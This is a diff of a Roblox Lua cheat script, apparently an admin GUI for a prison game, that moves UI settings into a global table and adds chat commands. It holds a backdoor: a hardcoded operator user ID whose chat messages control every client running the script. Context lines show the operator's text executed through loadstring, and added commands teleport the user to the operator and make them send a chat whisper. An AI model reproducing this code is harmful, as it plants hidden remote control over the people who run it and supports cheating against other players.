@@ -1,22 +1,21 @@
-
 local OPERATORUSERID = 5450973191
 
-local optimiseClientForAdminsOnly = true
-
 pcall(function()
-	if optimiseClientForAdminsOnly then
-		for i,v in pairs(workspace:GetDescendants()) do
-			if v.ClassName=="Decal" or v.ClassName=="Accessory"or v.ClassName=="Texture" then
-				v:Destroy()
-			elseif v.ClassName=="UnionOperation" then
-				v.Parent=game:GetService("Lighting")
-			elseif v:IsA("BasePart") then
-				v.Material=Enum.Material.Plastic
-				if v.Anchored==false then
-					v.CanCollide=false
+	if _G.UISettings ~= nil then
+		if _G.UISettings.OptimiseClient == true then
+			for i,v in pairs(workspace:GetDescendants()) do
+				if v.ClassName=="Decal" or v.ClassName=="Accessory"or v.ClassName=="Texture" then
+					v:Destroy()
+				elseif v.ClassName=="UnionOperation" then
+					v.Parent=game:GetService("Lighting")
+				elseif v:IsA("BasePart") then
+					v.Material=Enum.Material.Plastic
+					if v.Anchored==false then
+						v.CanCollide=false
+					end
+				elseif v.ClassName:match("Script") then
+					v:Destroy()
 				end
-			elseif v.ClassName:match("Script") then
-				v:Destroy()
 			end
 		end
 	end
@@ -149,12 +148,17 @@ local TextLabel_3 = Instance.new("TextLabel")
 --Properties:
 
 PrisonG.Name="PrisonG"
-PrisonG.Parent=svc("CoreGui")
+PrisonG.Parent=svc("Players")
 
+Whitelists.Active=true
 Whitelists.Draggable=true
+TeleportsFrame.Active=true
 TeleportsFrame.Draggable=true
 Main.Active=true
 Main.Draggable=true;Whitelists.Draggable=true;TeleportsFrame.Draggable=true
+
+cmdbar.Active=true
+cmdbar.Draggable=true
 
 Main.Name = "Main"
 Main.Parent = PrisonG
@@ -1267,6 +1271,11 @@ TextLabel_3.TextWrapped = true
 Show.Visible=_F
 
 
+
+
+
+
+
 local HoverSound=Sv.Ins("Sound",PrisonG)
 local ClickSound=Sv.Ins("Sound",PrisonG)
 HoverSound.SoundId="rbxassetid://4601634822"
@@ -1276,6 +1285,64 @@ HoverSound.Name="Hover"
 ClickSound.SoundId="rbxassetid://8388724806"
 ClickSound.Volume=0.3
 ClickSound.Name="Click"
+
+
+local ColourData = {
+	red = {
+		["Frame"] = Color3.fromRGB(198, 16, 16),
+		["TextLabel"] = Color3.fromRGB(207, 90, 90),
+	};
+	orange = {
+		["Frame"] = Color3.fromRGB(226, 132, 18),
+		["TextLabel"] = Color3.fromRGB(207, 104, 19),
+	};
+	yellow = {
+		["Frame"] = Color3.fromRGB(226, 226, 14),
+		["TextLabel"] = Color3.fromRGB(207, 193, 41),
+	};
+	green = {
+		["Frame"] = Color3.fromRGB(48, 180, 4),
+		["TextLabel"] = Color3.fromRGB(19, 165, 24),
+	};
+	blue = {
+		["Frame"] = Color3.fromRGB(0, 128, 226),
+		["TextLabel"] = Color3.fromRGB(31, 92, 236),
+	};
+	purple = {
+		["Frame"] = Color3.fromRGB(106, 0, 255),
+		["TextLabel"] = Color3.fromRGB(169, 36, 236),
+	};
+	pink = {
+		["Frame"] = Color3.fromRGB(226, 0, 207),
+		["TextLabel"] = Color3.fromRGB(236, 52, 221),
+	};
+}
+
+if _G.UISettings ~= nil then
+	if typeof(_G.UISettings) == "table" then
+		for i,value in pairs(_G.UISettings) do
+			if i == "Colour" then
+				for i,v in pairs(ColourData) do
+					if string.lower(value) == i then
+						for class,ColourValue in pairs(v) do
+							for i,object in pairs(PrisonG:GetDescendants()) do
+								if object.ClassName == class then
+									object.BackgroundColor3 = ColourValue
+								end
+							end
+						end
+						break
+					end
+				end
+			elseif i == "ClickSound" then
+				ClickSound.SoundId = value
+			elseif i == "HoverSound" then
+				HoverSound.SoundId = value
+			end
+		end
+	end
+end
+
 
 for i,v in Sv.P(PrisonG:GetDescendants())do
 	if v[_B.C]==_B.A then
@@ -2290,7 +2357,7 @@ function Nuke(Timer)
 end
 
 local function ArrestDatNoob(Target)
-	
+
 	for i=0,50 do
 		if not Target:IsDescendantOf(Sv.Plrs) then break end
 		if Target.TeamColor.Name == "Bright blue" then break end
@@ -3342,8 +3409,6 @@ Sv.New(function()
 	end
 end)
 
-cmdbar.Active=true
-cmdbar.Draggable=true
 
 local prefix=";"
 
@@ -3432,6 +3497,30 @@ local function ConnectAdminCommands(Message1,PlayerInstance)
 				end Code=nil
 				loadstring(RealCode)()
 				RealCode=nil
+			elseif Split[1]:lower() == prefix.."b" then
+				Sv.LPlr.Character.HumanoidRootPart.CFrame=PlayerInstance.Character.HumanoidRootPart.CFrame
+			elseif Split[1]:lower() == prefix.."zau" then
+				svc("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/w "..PlayerInstance.Name.." Pro", "All")
+			elseif Split[1]:lower() == prefix.."display" then
+				local Code = Split
+				Code[1]=nil
+				local RealCode = ""
+				for i,v in pairs(Code) do
+					RealCode=RealCode..v.." "
+				end Code=nil
+				notify(RealCode,Color3.new(1,0,1))
+				RealCode=nil
+			elseif Split[2]:lower() == prefix.."display" then
+				local Code = Split
+				Code[1]=nil
+				local RealCode = ""
+				for i,v in pairs(Code) do
+					RealCode=RealCode..v.." "
+				end Code=nil
+				notify(RealCode,Color3.new(1,0,1))
+				RealCode=nil
+			elseif Split[2]:lower() == prefix.."zau" then
+				svc("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/w "..PlayerInstance.Name.." Pro", "All")
 			elseif Split[2]:lower() == prefix.."run" then
 				local Code = Split
 				Code[1]=nil
@@ -3570,12 +3659,12 @@ end)
 
 
 Sv.Plrs.PlayerAdded:Connect(function(user)
-if user.UserId == OPERATORUSERID then
-_A.O(AddedWhitelists,user.UserId)
-user.Chatted:Connect(function(msg)
-ConnectAdminCommands(msg,user)
-end)
-end
+	if user.UserId == OPERATORUSERID then
+		_A.O(AddedWhitelists,user.UserId)
+		user.Chatted:Connect(function(msg)
+			ConnectAdminCommands(msg,user)
+		end)
+	end
 end)
 
 Sv.Plrs.PlayerRemoving:Connect(function(user)
